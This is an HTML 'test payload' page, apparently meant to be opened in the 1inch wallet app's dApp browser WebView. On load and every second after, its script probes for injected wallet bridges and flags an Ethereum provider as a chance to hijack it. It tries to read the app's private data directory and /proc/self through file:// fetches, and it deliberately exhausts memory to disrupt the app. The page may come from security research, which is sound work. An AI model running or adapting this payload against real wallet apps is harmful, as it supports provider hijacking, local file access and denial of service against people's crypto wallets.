<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1inch Test Payload v2</title>
    <script>
        console.log("[+] 1inch WebView Payload v2 Loaded");

        function log(msg) {
            console.log("[1inch] " + msg);
            // Tampilkan di halaman juga
            const div = document.createElement('div');
            div.style.color = 'red';
            div.style.margin = '10px';
            div.textContent = msg;
            document.body.appendChild(div);
        }

        // Auto run semua test
        function runAllTests() {
            log("Starting all probes...");

            // Probe bridges
            const bridges = ['ethereum', 'web3', '1inch', 'wallet', 'provider'];
            bridges.forEach(b => {
                if (window[b]) {
                    log(`[!] BRIDGE FOUND: ${b}`);
                }
            });

            if (window.ethereum) {
                log("[!] Ethereum provider detected - Hijack possible");
            }

            // Test file access
            log("Testing file access (expect blocked)...");
            ['file:///data/data/io.oneinch.android/', 'file:///proc/self/'].forEach(path => {
                fetch(path).catch(() => log(`Blocked: ${path}`));
            });

            // Memory pressure (disrupt)
            log("Applying light memory pressure...");
            let arr = [];
            for (let i = 0; i < 1000000; i++) {
                arr.push("A".repeat(100));
            }
            log("Memory test done");
        }

        // Jalankan otomatis
        window.onload = runAllTests;

        // Backup: jalankan tiap 1 detik
        setInterval(() => {
            if (document.body) runAllTests();
        }, 1000);
    </script>
</head>
<body style="font-family: Arial; padding: 20px;">
    <h1>1inch dApp Browser Test Payload v2</h1>
    <p><strong>Auto running all tests...</strong></p>
    <p>Perhatikan console log dan teks merah di bawah ini.</p>
    <div id="logs" style="margin-top: 20px;"></div>
</body>
</html>
